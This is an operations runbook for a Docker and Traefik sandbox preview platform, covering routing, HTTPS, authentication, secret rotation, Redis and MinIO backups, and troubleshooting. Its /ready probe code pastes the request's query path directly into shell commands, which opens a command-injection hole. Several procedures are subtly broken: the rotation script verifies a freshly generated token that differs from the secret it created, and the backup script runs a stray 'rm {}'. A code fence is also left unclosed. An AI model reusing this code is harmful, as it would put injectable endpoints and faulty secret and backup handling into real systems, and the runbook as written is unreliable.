# Preview Sandbox Platform - Operations Runbook v1.2.0

## Overview

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Public Web    │    │   Load Balancer │    │   API Service   │
│                 │────│    (Traefik)    │────│                 │
│ Port 80/443    │    │                 │    │ Port 3001       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                                                        │
                                                        ▼
                              ┌─────────────────────────────────┐
                              │     Private Network Zone       │
                              │  ┌─────────────────┐          │
                              │  │   Docker Daemon│          │
                              │  │                 │          │
                              │  │    Socket      │          │
                              │  └─────────────────┘          │
                              └─────────────────────────────────┘
```

**Purpose**: Secure sandbox preview platform for running isolated Node.js applications with automatic provisioning, health monitoring, and lifecycle management.

**Prerequisites**:
- Docker + Docker Compose v2.38+
- Node.js 18+ (for local development)
- Wildcard domain for sandbox URLs (e.g., `*.hellyo.io`)
- Redis instance for queuing and state
- MinIO S3-compatible storage for artifacts

## Compatibility Matrix

| Component | Version | Notes |
|-----------|---------|-------|
| **Docker Engine** | 24.0+ | Required for compose v2.38+ |
| **Docker Compose** | v2.38+ | Required for healthcheck and features |
| **Traefik** | v3.1.x | Reverse proxy with middleware support |
| **Node.js** | 18/20 | Runtime for sandbox applications |
| **Redis** | 7.x | Queue and session storage |
| **MinIO** | RELEASE.2024-01-01T00-00-00Z | S3-compatible storage |
| **Linux Kernel** | 5.4+ | Container runtime requirements |

---

**Copy & paste safely**: All commands assume you've `export PREVIEW_DOMAIN` and sourced `.env` at the project root.

**Preflight check**:
```bash
docker compose config && docker compose ps && docker network inspect preview_sbx-network | jq '.[0].IPAM.Config'
```

---

## Environment Variables

| Name | Purpose | Example |
|------|---------|---------|
| `PREVIEW_DOMAIN` | Base domain for sandbox URLs | `hellyo.io` |
| `API_TOKEN` | Bearer token for admin endpoints | `preview-test-token-2025` |
| `REDIS_URL` | Redis connection for queues/storage | `redis://redis:6379` |
| `MINIO_ROOT_USER` | MinIO access key | `admin` |
| `MINIO_ROOT_PASSWORD` | MinIO secret key | `supersecret` |
| `S3_ENDPOINT` | MinIO endpoint URL | `http://172.18.0.3:9000` |
| `S3_BUCKET` | S3 bucket for artifacts | `sandbox` |
| `S3_REGION` | S3 region identifier | `us-east-1` |
| `PORT` | API service listen port | `3001` |
| `NODE_ENV` | Node runtime environment | `production` |
| `MAX_CONCURRENT_BUILDS` | Concurrent build limit | `3` |
| `DEV_TTL_MINUTES` | Dev sandbox TTL | `45` |
| `PROD_TTL_MINUTES` | Prod sandbox TTL | `240` |
| `DEFAULT_CPU` | Default CPU shares | `0.75` |
| `DEFAULT_MEM` | Default memory limit | `768m` |
| `DEFAULT_CPU_PROD` | Prod CPU shares | `0.25` |
| `DEFAULT_MEM_PROD` | Prod memory limit | `256m` |

---

## 10-Minute Truth Test

### Health & Connectivity

```bash
# Health endpoint (public observability)
curl -s -H "Host: api.$PREVIEW_DOMAIN" http://127.0.0.1/health | jq .
```
**Expected**: 200 response with `response_id`, `status: "ok"`, and timestamp.

```bash
# Service mesh readiness (requires auth)
curl -s -H "Host: api.$PREVIEW_DOMAIN" \
     -H "Authorization: Bearer $API_TOKEN" \
     "http://127.0.0.1/sandbox/demo-id/ready?path=/"
```
**Expected**: 200 with `ready: true`, `status: 200`, `response_time: <ms>`, `method: "curl|wget|node"`

### Authentication

```bash
# Unauthenticated debug endpoint (must fail)
curl -s -o /dev/null -w '%{http_code}\n' \
     -H "Host: api.$PREVIEW_DOMAIN" \
     "http://127.0.0.1/debug/queue"

# Authenticated debug endpoint (must succeed)
curl -s -H "Host: api.$PREVIEW_DOMAIN" \
     -H "Authorization: Bearer $API_TOKEN" \
     "http://127.0.0.1/debug/queue" | jq .redis.pingMs
```
**Expected**: First returns `401`, second returns `200` with Redis stats.

### Size & Content Validation

```bash
# Test 413 - Request entity too large (12MB payload)
python3 - <<'PY' | curl -s -o /dev/null -w '%{http_code}\n' \
  -H 'Host: api.$PREVIEW_DOMAIN' \
  -H 'Content-Type: application/json' \
  --data-binary @- http://127.0.0.1/sandbox
import sys, json, base64
blob = b"A" * (12*1024*1024)  # 12MB base64
payload = {"healthPath":"/","files":[{"path":"oversized.txt","content":base64.b64encode(blob).decode()}]}
sys.stdout.write(json.dumps(payload))
PY

# Test 415 - Unsupported content type
curl -s -o /dev/null -w '%{http_code}\n' \
     -H 'Host: api.$PREVIEW_DOMAIN' \
     -H 'Content-Type: application/octet-stream' \
     -d '{"test":"data"}' \
     http://127.0.0.1/sandbox
```
**Expected**: First returns `413`, second returns `415`.

### Infrastructure Validation

```bash
# Redis DNS resolution from API container
docker exec preview-api-1 getent hosts redis
docker exec preview-api-1 node -e "require('net').connect(6379,'redis').on('connect',()=>{console.log('✅ Redis TCP OK');process.exit(0)}).on('error',()=>process.exit(1))"

# /ready endpoint with fallback probe (curl → wget → node)
curl -s -H "Host: api.$PREVIEW_DOMAIN" \
     -H "Authorization: Bearer $API_TOKEN" \
     "http://127.0.0.1/sandbox/demo-id/ready" | jq .method
```
**Expected**: Redis resolves to IP, TCP connection succeeds, `/ready` shows probe method used.

---

## API & Admin Endpoints

### Public Endpoints

| Method | Path | Auth Required | Status Codes | Sample Response |
|--------|------|---------------|---------------|----------------|
| `GET` | `/health` | ❌ No | 200 | `{"status":"ok","response_id":"..."}` |

### Sandbox Creation (`POST /sandbox`)

**Request Parameters**:

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `mode` | string | No | "prod" | Sandbox mode: "dev" or "prod" |
| `healthPath` | string | No | "/" | Health check path for readiness |
| `files[].path` | string | Yes | - | File path in sandbox |
| `files[].content` | string | Yes | - | Base64-encoded file content |
| `limits.memory` | string | No | "768m" | Memory limit ("prod": "256m") |
| `limits.cpu` | number | No | 0.75 | CPU shares ("prod": 0.25) |

**Size Limits**:
- Per-file content: 8MB base64-encoded (~6MB raw content due to 4/3 overhead)
- Total request body: 10MB
- Files count: 100 maximum

**Example Payload**:
```json
{
  "healthPath": "/",
  "files": [
    {
      "path": "package.json",
      "content": "eyJuYW1lIjoic2FuZGJveCIsInNjcmlwdHMiOnsic3RhcnQiOiJub2RlIGluZGV4LmpzIn19"
    }
  ]
}
```

**Response**:
- `202 Accepted`: Async creation started
```json
{
  "id": "abc123",
  "url": "https://abc123.hellyo.io"
}
```

**Public Endpoint**:
| `POST` | `/sandbox` | ❌ No | 202, 413, 415 | `{"id":"abc123","url":"https://abc123.hellyo.io"}` |

### Admin Endpoints (Require `Authorization: Bearer $API_TOKEN`)

| Method | Path | Status Codes | Sample Response |
|--------|------|---------------|----------------|
| `GET` | `/debug/queue` | 200, 401 | `{"redis":{"pingMs":0},"queues":{...}}` |
| `GET` | `/debug/docker` | 200, 401 | `{"pingMs":15,"containers":[...]}` |
| `GET` | `/debug/docker?dryRun=1` | 200, 401 | `{"dryRun":true,"success":true}` |
| `GET` | `/sandbox/:id/logs/tail` | 200, 401, 404 | `text/plain` (server logs) |
| `GET` | `/sandbox/:id/logs/tail?json=1` | 200, 401, 404 | `application/json` (`{"logs":[...],"truncated":false}`) |
| `GET` | `/sandbox/:id/ready` | 200, 401, 404 | `{"ready":true,"status":200,"method":"curl"}` |
| `DELETE` | `/sandbox/:id` | 200, 401, 404 | `{"success":true,"id":"demo123"}` |

---

## Traefik Configuration

### Labels Applied

```yaml
labels:
  - "traefik.enable=true"
  - "traefik.docker.network=preview_sbx-network"

  # Middlewares
  - "traefik.http.middlewares.limit.buffering.maxRequestBodyBytes=10485760"
  - "traefik.http.middlewares.admin-allowlist.ipAllowList.sourceRange=127.0.0.1/32,172.18.0.0/16"
  - "traefik.http.middlewares.rate-limit.rateLimit.average=100"
  - "traefik.http.middlewares.rate-limit.rateLimit.burst=50"
  - "traefik.http.middlewares.rate-limit.rateLimit.period=1m"

  # Single service definition
  - "traefik.http.services.api.loadbalancer.server.port=3001"

  # Routers
  - "traefik.http.routers.api-public.rule=Host(`api.${PREVIEW_DOMAIN}`) && PathPrefix(`/health`)"
  - "traefik.http.routers.api-public.middlewares=limit"
  - "traefik.http.routers.api-public.service=api"

  - "traefik.http.routers.api-admin.rule=Host(`api.${PREVIEW_DOMAIN}`)"
  - "traefik.http.routers.api-admin.middlewares=admin-allowlist,rate-limit,limit"
  - "traefik.http.routers.api-admin.service=api"
```

> **Rate Limit Details**: The configuration sets 100 requests per minute with a 50-request burst. The `period=1m` is explicit - this applies to a rolling 60-second window, not a calendar minute period. Note: Admin router uses same rate-limit profile; consider a stricter profile (e.g., `average=20` + `burst=10`) for admin endpoints if needed.

> **Why single service?** Traefik v3 errors if a router autolinks to multiple services. By defining a single `api` service and pointing both routers (`api-public`, `api-admin`) to it, we avoid service linking conflicts while maintaining separate middleware chains for public vs admin access.

### Traefik Command Flags

```bash
command:
  - --providers.docker=true
  - --providers.docker.exposedbydefault=false
  - --providers.docker.network=preview_sbx-network
  - --providers.docker.constraints=Label(`com.docker.compose.project`,`preview`)
  - --entrypoints.web.address=:80
  - --log.level=INFO
```

> **Constraint Gotcha**: The `Label(com.docker.compose.project,preview)` constraint requires the compose project name to be exactly `preview`. If your folder is named differently or using `-p` flag, override with: `COMPOSE_PROJECT_NAME=preview docker compose up -d`

### Middlewares Chain

1. **limit**: 10MB body buffering limit
2. **admin-allowlist**: IP allowlist (localhost + 172.18.0.0/16)
3. **rate-limit**: 100 req/min average, 50 burst

**Note**: Dashboard explicitly disabled (`no --api.insecure=true`) for production security.

---

## Enabling HTTPS

### Traefik SSL/TLS Configuration

```yaml
services:
  traefik:
    image: traefik:v3.1
    command:
      - --providers.docker=true
      - --providers.docker.exposedbydefault=false
      - --providers.docker.network=preview_sbx-network
      - --providers.docker.constraints=Label(`com.docker.compose.project`,`preview`)
      - --entrypoints.web.address=:80
      - --entrypoints.websecure.address=:443
      - --certificatesresolvers.letsencrypt.acme.httpchallenge=true
      - --certificatesresolvers.letsencrypt.acme.httpchallenge.entrypoint=web
      - --certificatesresolvers.letsencrypt.acme.email=${ACME_EMAIL}
      - --log.level=INFO
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./letsencrypt:/letsencrypt
```

### HTTPS Router Labels

```yaml
labels:
  # HTTPS router (redirect HTTP → HTTPS)
  - "traefik.http.routers.api-redirect.rule=Host(`api.${PREVIEW_DOMAIN}`)"
  - "traefik.http.routers.api-redirect.entrypoints=web"
  - "traefik.http.routers.api-redirect.middlewares=redirect-to-https"
  - "traefik.http.middlewares.redirect-to-https.redirectscheme.scheme=https"

  # HTTPS services
  - "traefik.http.routers.api-public-secure.rule=Host(`api.${PREVIEW_DOMAIN}`) && PathPrefix(`/health`)"
  - "traefik.http.routers.api-public-secure.entrypoints=websecure"
  - "traefik.http.routers.api-public-secure.tls.certresolver=letsencrypt"
  - "traefik.http.routers.api-public-secure.middlewares=limit,hsts"
  - "traefik.http.routers.api-public-secure.service=api"

  - "traefik.http.routers.api-admin-secure.rule=Host(`api.${PREVIEW_DOMAIN}`)"
  - "traefik.http.routers.api-admin-secure.entrypoints=websecure"
  - "traefik.http.routers.api-admin-secure.tls.certresolver=letsencrypt"
  - "traefik.http.routers.api-admin-secure.middlewares=admin-allowlist,rate-limit,limit,hsts"
  - "traefik.http.routers.api-admin-secure.service=api"

  # HSTS Middleware
  - "traefik.http.middlewares.hsts.headers.stsIncludeSubdomains=true"
  - "traefik.http.middlewares.hsts.headers.stsPreload=true"
  - "traefik.http.middlewares.hsts.headers.stsSeconds=31536000"
```

### Prerequisites for HTTPS

1. **Domain Requirements**:
   - Wildcard DNS `*.hellyo.io` pointing to server IP
   - `api.${PREVIEW_DOMAIN}` specifically for API endpoints

2. **Environment Variables**:
   ```bash
   ACME_EMAIL=admin@hellyo.io  # For Let's Encrypt notices
   ```

3. **Firewall Rules**:
   ```bash
   # Allow HTTP/HTTPS traffic
   sudo ufw allow 80/tcp
   sudo ufw allow 443/tcp
   ```

### Certificate Management

```bash
# Certificate location (auto-generated)
./letsencrypt/acme.json

# View certificates
docker exec preview-traefik-1 ls /letsencrypt/

# Force certificate renewal (if needed)
docker restart preview-traefik-1
```

### ACME Configuration Details

**Important**: Let's Encrypt certificates are stored in `acme.json`. Ensure proper permissions:

```bash
# Set secure permissions for ACME certificates
sudo chown -R $(whoami):$(whoami) ./letsencrypt
chmod 600 ./letsencrypt/acme.json
```

**ACME_EMAIL**: Must be set in the environment used by `docker compose` for certificate issuance and renewal notices:

```bash
# Add to .env for Let's Encrypt
export ACME_EMAIL=admin@hellyo.io
# Or set directly in compose environment
ACME_EMAIL=admin@hellyo.io
```

⚠️ **Production Note**: Without `ACME_EMAIL`, Let's Encrypt cannot send renewal failure notices or account recovery information.

### Production HTTPS Checklist

- [ ] Wildcard DNS `*.hellyo.io` → server IP
- [ ] `ACME_EMAIL` set in environment
- [ ] Port 443 opened in firewall
- [ ] HSTS headers enabled
- [ ] HTTP → HTTPS redirect configured
- [ ] Let's Encrypt certificates auto-generated

---

## Security Hardening

### Docker Socket Security

```yaml
# Read-only mounting (current)
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:ro

# Long-term: docker-socket-proxy (recommended)
services:
  docker-socket-proxy:
    image: tecnativa/docker-socket-proxy
    environment:
      CONTAINERS: 1
      INFO: 1
      VERSION: 1
      EVENTS: 1
      EXEC: 1
      INSPECT: 1
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
```

### Application Security

```javascript
// Trust proxy for proper headers behind Traefik
app.set('trust proxy', 1);

// Remove Express signatures
app.disable('x-powered-by');

// Secure headers via Helmet
app.use(helmet());

// Content Security Policy (if serving sandbox assets)
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"], // Relaxed for sandbox content
    styleSrc: ["'self'", "'unsafe-inline'"], // Relaxed for sandbox assets
    imgSrc: ["'self'", 'data:', 'blob:'],
    connectSrc: ["'self'", 'ws:', 'wss:'],
    fontSrc: ["'self'", 'data:'],
    objectSrc: ["'none'"],
    baseUri: ["'self'"]
  },
  reportOnly: false // Set to true for initial CSP deployment
}));

// Auth middleware for admin routes
function requireAuth(req, res, next) {
  const token = req.headers.authorization?.slice(7);
  if (token !== process.env.API_TOKEN) return res.status(401).end();
  next();
}
```

### Secret Management

**Production**: Use Docker secret with `_FILE` variant:

```yaml
services:
  api:
    environment:
      - API_TOKEN_FILE=/run/secrets/api_token
    secrets:
      - api_token

secrets:
  api_token:
    external: true

### Secrets Rotation Playbook

**3-Step Rotation Procedure**:

```bash
# STEP 1: Create new secret (without disrupting running services)
echo "$(openssl rand -base64 32)" | docker secret create api_token_v2 -
echo "New secret created: api_token_v2"

# STEP 2: Deploy with new secret
# Update docker-compose.yml to use new secret
sed -i 's/api_token:/api_token_v2:/' docker-compose.yml
docker compose up -d --force-recreate api
echo "Waiting for service with new secret..."
sleep 15

# STEP 3: Verify and revoke old secret
NEW_TOKEN=$(openssl rand -base64 32)
printf '%s' "$NEW_TOKEN" > /tmp/api_token_v2
echo "Token generated and stored in /tmp/api_token_v2"

# Option 1: Use curl container to test new secret (without exposing in history)
docker run --rm \
  --network preview_sbx-network \
  -v /tmp/api_token_v2:/run/secrets/api_token_v2:ro \
  curlimages/curl:8.9.1 \
  -H "Host: api.${PREVIEW_DOMAIN}" \
  sh -lc 'TOKEN=$(cat /run/secrets/api_token_v2); curl -s -H "Authorization: Bearer $TOKEN" http://api/health | jq -e .status' || exit 1

# Option 2: Manual test with out-of-band token storage
# curl -s -H "Authorization: Bearer $NEW_TOKEN" "http://api.${PREVIEW_DOMAIN}/health" | jq -e '.status'

echo "New secret verified - revoking old secret"
docker secret rm api_token
rm -f /tmp/api_token_v2
echo "Rotation completed successfully"
```

**Rotation Checklist**:
- [ ] Generate new secret (cryptographically random)
- [ ] Update compose config to reference new secret
- [ ] Force recreate service with new secret
- [ ] Test functionality with new secret
- [ ] Revoke old secret only after verification
- [ ] Update monitoring/alerts to use new secret

**Testing Rotation**:
```bash
# Verify old secret no longer works
curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer OLD_TOKEN" "http://api.${PREVIEW_DOMAIN}/health"
# Should return 401

# Verify new secret works
curl -s -H "Authorization: Bearer NEW_TOKEN" "http://api.${PREVIEW_DOMAIN}/health" | jq -e '.status'
# Should return 200
```

# Create secret:
# echo "$TOKEN" | docker secret create api_token -
```

### Network Security

- **IP Allowlist**: `127.0.0.1/32,172.18.0.0/16` (exact Docker subnet)
- **Rate Limiting**: 100 req/min, 50 burst prevents abuse
- **Private Network**: Services only accessible via Traefik proxy
- **No Host Ports**: Only port 80 exposed (Traefik)

---

## Resilience

### Redis Configuration

```javascript
// Current retry settings (default ioredis)
const redis = new Redis(REDIS_URL, {
  maxRetriesPerRequest: 3,
  retryDelayOnFailover: 100,
  enableReadyCheck: true,
});

// Enhanced retry for production
const redis = new Redis(REDIS_URL, {
  maxRetriesPerRequest: 5,
  retryDelayOnFailover: 200,
  enableReadyCheck: true,
  connectTimeout: 10000,
  commandTimeout: 5000,
});
```

### /ready Endpoint Resilience

```javascript
// Fallback probe with actual HTTP latency measurement: curl → wget → node fetch
for (const testCmd of [
  `sh -lc "curl -s -o /dev/null -w '%{http_code} %{time_total}' http://127.0.0.1:3000${req.query.path||'/'}"`,
  `sh -lc "wget -q --spider --server-response http://127.0.0.1:3000${req.query.path||'/'} 2>&1 | awk '/^  HTTP/{print \$2}'"`,
  `node -e "require('node-fetch')('http://127.0.0.1:3000${req.query.path||'/'}').then(r=>console.log(r.status))"`
]) {
  try {
    // Execute probe with 8s timeout
    const exec = await container.exec({
      Cmd: ["sh", "-lc", testCmd],
      AttachStdout: true,
      AttachStderr: true
    });

    const stream = await exec.start({});
    const chunks = await new Promise((resolve, reject) => {
      const output = [];
      const timeout = setTimeout(() => {
        reject(new Error('Health check timeout'));
        stream.destroy();
      }, 8000);

      stream.on('data', (chunk) => output.push(chunk));
      stream.on('end', () => {
        clearTimeout(timeout);
        resolve(output);
      });
      stream.on('error', reject);
    });

    const output = Buffer.concat(chunks).toString().trim();

    // Parse curl output (HTTP code and latency)
    if (testCmd.includes('curl')) {
      const [codeStr, timeStr] = output.split(/\s+/);
      const statusCode = parseInt(codeStr, 10) || 0;
      const latency_ms = timeStr ? Math.round(parseFloat(timeStr) * 1000) : null;

      const isHealthy = statusCode >= 200 && statusCode < 400;
      const startTime = info.State?.StartedAt;
      const uptime_ms = startTime ? Date.now() - new Date(startTime).getTime() : null;

      res.json({
        ready: isHealthy,
        status: statusCode,
        latency_ms,    // Actual HTTP round-trip latency
        uptime_ms,      // Container uptime since start
        method: 'curl'
      });
    } else {
      // Fallback to status-only parsing for wget/node
      const statusCode = parseInt(output.trim(), 10) || 0;
      const isHealthy = statusCode >= 200 && statusCode < 400;

      res.json({
        ready: isHealthy,
        status: statusCode,
        latency_ms: null,  // Not available with these methods
        method: testCmd.includes('wget') ? 'wget' : 'node'
      });
    }

    break; // Success, exit loop
  } catch (error) {
    continue; // Try next method
  }
}
```

### Sandbox Lifecycle Resilience

- **Automatic Cleanup**: Scheduled task removes stale containers every minute
- **Orphan Detection**: Containers without queue entries are cleaned up
- **Resource Limits**: CPU/memory constraints prevent resource exhaustion
- **Health Monitoring**: `/ready` probes detect sandbox failures

---

## Backup and Restore Procedures

### MinIO Bucket Backup & Lifecycle

**Automated Bucket Backup**:

```bash
# Backup MinIO bucket to local archive
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)

# Use temporary minio/mc container for backup with env vars
docker run --rm --name mc-backup \
  --network preview_sbx-network \
  -v "$(pwd)/backups":/backups \
  --env-file preview/.env \
  minio/mc sh -lc '
    set -e
    mc alias set minio http://preview-minio-1:9000 "$MINIO_ROOT_USER" "$MINIO_ROOT_PASSWORD"
    mc cp --recursive minio/"$S3_BUCKET" /tmp/"$S3_BUCKET"-backup-"$BACKUP_DATE"
    tar -czf /backups/s3-backup-"$BACKUP_DATE".tar.gz -C /tmp "$S3_BUCKET"-backup-"$BACKUP_DATE"
  '
echo "MinIO backup completed: backups/s3-backup-$BACKUP_DATE.tar.gz"
```

**MinIO Lifecycle Configuration**:

> **Note**: `MINIO_BUCKET_LIFECYCLE: 'true'` is not a standard environment variable. Use `mc ilm` commands to configure lifecycle policies:

```bash
# Configure lifecycle policies for automatic cleanup/expiry
docker run --rm --name mc-lifecycle \
  --network preview_sbx-network \
  --env-file preview/.env \
  minio/mc sh -lc '
    # Set bucket lifecycle configuration
    mc ilm add minio/"$S3_BUCKET" --expiry-days 7
    mc ilm rule add minio/"$S3_BUCKET" --expiry-days 7 --prefix "tmp/"

    # Verify lifecycle rules
    mc ilm ls minio/"$S3_BUCKET"
  '
```

**Retention Examples**:
- `--expiry-days 7`: Delete objects after 7 days
- `--prefix "tmp/"`: Apply only to objects with prefix
- Use `--transition-days` for tiering to cold storage if available

**MinIO Restore Procedure**:

```bash
# Restore MinIO bucket from backup
backup_file="backups/s3-backup-20240101_120000.tar.gz"

# Use temporary minio/mc container for restore with env vars
docker run --rm --name mc-restore \
  --network preview_sbx-network \
  -v "$(pwd)/backups":/backups \
  --env-file preview/.env \
  minio/mc sh -lc '
    set -e
    tar -xzf /backups/$(basename "$backup_file") -C /tmp
    mc alias set minio http://preview-minio-1:9000 "$MINIO_ROOT_USER" "$MINIO_ROOT_PASSWORD"
    mc mb --ignore-existing minio/"$S3_BUCKET"
    mc cp --recursive /tmp/"$S3_BUCKET"-backup-*/ minio/"$S3_BUCKET"/
  '
echo "MinIO restore completed from $backup_file"
```

### Redis Backup & Restore

**RDB (Redis Database File) Backup**:

```bash
# Redis RDB backup (persistent storage)
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)
docker exec preview-redis-1 redis-cli BGSAVE
sleep 5  # Wait for BGSAVE to complete
docker cp preview-redis-1:/data/dump.rdb ./backups/redis-dump-$BACKUP_DATE.rdb
echo "Redis RDB backup completed: backups/redis-dump-$BACKUP_DATE.rdb"
```

**AOF (Append-Only File) Backup**:

```bash
# Redis AOF backup
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)
docker exec preview-redis-1 redis-cli BGREWRITEAOF
sleep 3
docker cp preview-redis-1:/data/appendonly.aof ./backups/redis-aof-$BACKUP_DATE.aof
echo "Redis AOF backup completed: backups/redis-aof-$BACKUP_DATE.aof"
```

**Redis Restore Procedure**:

```bash
# Redis restore from RDB
backup_file="backups/redis-dump-20240101_120000.rdb"
docker cp $backup_file preview-redis-1:/data/dump.rdb
docker restart preview-redis-1
echo "Redis restore completed from $backup_file"

# Redis restore from AOF
backup_file="backups/redis-aof-20240101_120000.aof"
docker cp $backup_file preview-redis-1:/data/appendonly.aof
docker restart preview-redis-1
echo "Redis restore completed from $backup_file"
```

### Automated Backup Script

```bash
#!/bin/bash
# /usr/local/bin/backup-platform.sh
BACKUP_DIR="/var/backups/preview-platform"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
mkdir -p $BACKUP_DIR

# MinIO bucket backup (using minio/mc sidecar container)
echo "Backing up MinIO bucket..."
docker run --rm --name mc-backup-script \
  --network preview_sbx-network \
  -v "$BACKUP_DIR":/backups \
  --env-file preview/.env \
  minio/mc sh -lc "
    set -e
    mc alias set minio http://preview-minio-1:9000 \"\$MINIO_ROOT_USER\" \"\$MINIO_ROOT_PASSWORD\"
    mc cp --recursive minio/\"\$S3_BUCKET\" /tmp/\"\$S3_BUCKET\"-backup-\"\$TIMESTAMP\"
    tar -czf /backups/s3-backup-\"\$TIMESTAMP\".tar.gz -C /tmp \"\$S3_BUCKET\"-backup-\"\$TIMESTAMP\"
    rm -rf /tmp/\"\$S3_BUCKET\"-backup-\"\$TIMESTAMP\"
  "

# Redis RDB backup
echo "Backing up Redis RDB..."
docker exec preview-redis-1 redis-cli BGSAVE
sleep 5
docker cp preview-redis-1:/data/dump.rdb $BACKUP_DIR/redis-dump-$TIMESTAMP.rdb

# Cleanup old backups (keep 7 days)
find $BACKUP_DIR -name "*.tar.gz" -mtime +7 -delete
find $BACKUP_DIR -name "*.rdb" -mtime +7 -delete

echo "Backup completed at $TIMESTAMP"

# Optional: Encrypt archived backups (age encryption)
if command -v age &> /dev/null; then
  echo "Encrypting backups at rest..."
  find $BACKUP_DIR -name "*.tar.gz" -mtime +1 -exec age -r $(cat $BACKUP_DIR/../ops.agekey 2>/dev/null || age-keygen -y) -o {}.age {} \;
  rm {}  # Remove unencrypted original
fi
```

### Backup RTO & RPO Targets

**Recovery Time Objective (RTO)**:
- **Critical services**: 15 minutes (API, Redis, Traefik)
- **Data services**: 30 minutes (MinIO bucket restore)
- **Full platform**: 45 minutes (complete restore from backup)

**Recovery Point Objective (RPO)**:
- **Queue data**: 5 minutes (Redis AOF persistence)
- **Sandbox configs**: 15 minutes (MinIO bucket backup frequency)
- **Platform configuration**: 24 hours (Git repository backup)

**Backup Retention Policy**:
- **Hot backups**: 7 days (immediate restore capability)
- **Warm backups**: 30 days (offline restore)
- **Cold backups**: 90 days (compliance/archival)
- **Offsite**: Copy to S3/Glacier for disaster recovery

**RTO/RPO Validation Script**:
```bash
#!/bin/bash
echo "Starting RTO/RPO validation..."
start_time=$(date +%s)

# Simulate platform failure
docker compose down

# Restore from latest backup
./restore-platform.sh --latest

# Validate core services within RTO
timeout 300 make prereq || echo "❌ RTO exceeded (15m)"

# Calculate actual recovery time
recovery_time=$(($(date +%s) - start_time))
if [ $recovery_time -gt 900 ]; then  # 15 minutes
  echo "❌ RTO exceeded: ${recovery_time}s"
else
  echo "✅ RTO met: ${recovery_time}s"
fi
```

### Backup Encryption Setup

**Single-Time Setup (Age Encryption)**:

```bash
# Generate age encryption key once
age-keygen -o $BACKUP_DIR/../ops.agekey
echo "Generated age key at $BACKUP_DIR/../ops.agekey"

# Extract public key for encryption operations
age-keygen -y $BACKUP_DIR/../ops.agekey > $BACKUP_DIR/../ops.agepub

# Store the public key in environment for backup scripts
export AGE_PUBLIC_KEY=$(cat $BACKUP_DIR/../ops.agepub)
```

**Backup Encryption Example**:

```bash
# Encrypt single backup (manual)
tar -czf - ./backups/s3-backup-20240101_120000.tar.gz | \
  age -r "$AGE_PUBLIC_KEY" -o ./backups/s3-backup-20240101_120000.tar.gz.age

# Decrypt backup (manual)
age -d -i $BACKUP_DIR/../ops.agekey \
  ./backups/s3-backup-20240101_120000.tar.gz.age \
  -o ./backups/s3-backup-20240101_120000.tar.gz
```

### Backup Verification

```bash
# Verify MinIO backup integrity
for backup in ./backups/s3-backup-*.tar.gz; do
  echo "Verifying $backup..."
  tar -tzf "$backup" | head -5 || echo "❌ Backup corrupted: $backup"
done

# Verify Redis backup integrity
for backup in ./backups/redis-*.rdb; do
  echo "Verifying $backup..."
  docker run --rm -v "$(pwd)/$backup":/dump.rdb redis/redis-check-rdb /dump.rdb || echo "❌ Backup corrupted: $backup"
done

# Verify AOF backup integrity
for backup in ./backups/redis-*.aof; do
  echo "Verifying $backup..."
  docker run --rm -v "$(pwd)/$backup":/appendonly.aof redis/redis-check-aof /appendonly.aof || echo "❌ Backup corrupted: $backup"
done
```

---

## Troubleshooting

### Decision Tree: Common Failures

```
├── Health endpoint 404?
│   ├── Check Traefik logs for routing errors
│   ├── Verify PREVIEW_DOMAIN matches header
│   └── Ensure container has traefik.enable=true label
│
├── Auth always returning 401?
│   ├── Verify API_TOKEN in environment
│   ├── Check "Authorization: Bearer " prefix (including space)
│   └── Ensure requireAuth middleware is applied
│
├── Sandbox creation 413?
│   ├── Check payload size (max 10MB)
│   ├── Verify --data-binary @- usage (not -d)
│   └── Check Traefik buffering.limit middleware
│
├── Redis connection refused?
│   ├── Verify depends_on: [redis] in compose
│   ├── Check REDIS_URL=redis://redis:6379 (not IP)
│   └── Validate both services on same network
│
├── /ready endpoint failing?
│   ├── Check sandbox container exists and running
│   ├── Verify fallback probe methods available
│   └── Test manual probe: docker exec <sandbox> curl -s http://127.0.0.1:3000/
│
└── High latency/timeouts?
    ├── Check resource limits (CPU/memory)
    ├── Monitor Redis queue backlog
    └── Review Traefik rate limits (100/min avg)
```

### Port Conflicts

```bash
# Check port usage
docker ps --format 'table {{.ID}}\t{{.Image}}\t{{.Ports}}\t{{.Names}}'

# Kill conflicting containers
docker kill <container_name>
docker rm <container_name>

# Force recreation
docker compose up -d --force-recreate <service>
```

### Stale Labels After Recreate

```bash
# Remove running containers
docker compose down

# Prune unused networks/images
docker system prune -f

# Fresh start
docker compose up -d --build
```

### Auth Header Pitfalls

```bash
# ❌ Wrong (missing space)
-H "Authorization:Bearer $TOKEN"

# ❌ Wrong (case sensitivity)
-H "authorization: bearer $TOKEN"

# ✅ Correct
-H "Authorization: Bearer $TOKEN"
```

---

## Known Gotchas / Lessons Learned

- **Traefik CLI flags vs Labels**: `--middlewares.*` flags are invalid; use labels only
- **Service name conflicts**: Multiple services per router cause startup errors; use single shared service
- **Container recreation**: Labels only update on container recreate (not restart)
- **Binary data handling**: Use `--data-binary @-` not `-d` for proper size detection
- **Network filtering**: Docker constraints must match exact compose project name
- **Express middleware order**: Body parsing limits must come BEFORE route handlers
- **IP allowlist precision**: Use exact Docker subnet (e.g., 172.18.0.0/16) not broad ranges (172.16.0.0/12)
- **Redis service discovery**: Always use service names (`redis:6379`), not container IPs
- **Proxy headers**: `app.set('trust proxy', 1)` essential for HSTS/cookies behind Traefik

---

## CI Pipeline Assertions

### Running Locally

```bash
# Full test suite
make all-tests

# Individual checks
make prereq          # Prerequisites (API, Redis, MinIO health)
make auth-test        # Authentication enforcement
make health-observability-test # Health endpoint observability
make test-size-guard # Size validation limits
```

### CI Workflow Tests

```yaml
# Key assertions:
- 413 for >10MB payloads
- 415 for application/octet-stream
- 401 for all unauthenticated /debug/*
